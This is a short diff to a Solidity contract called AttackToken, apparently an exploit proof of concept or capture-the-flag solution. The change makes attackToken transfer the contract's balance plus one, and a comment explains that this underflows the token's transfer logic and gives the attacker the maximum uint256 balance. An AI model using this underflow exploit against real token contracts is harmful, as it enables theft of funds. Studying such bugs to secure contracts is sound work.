@@ -31,6 +31,7 @@ contract AttackToken {
 
     function attackToken(address user) public {
         uint bal = token.balanceOf(address(this));
-        token.transfer(user, type(uint).max - 1 - bal);
+        // this causes an underflow in the transfer and sets the attacker's balance to type(uint256).max value (115792089237316195423570985008687907853269984665640564039457584007913129639935)
+        token.transfer(user, bal + 1);
     }
 }
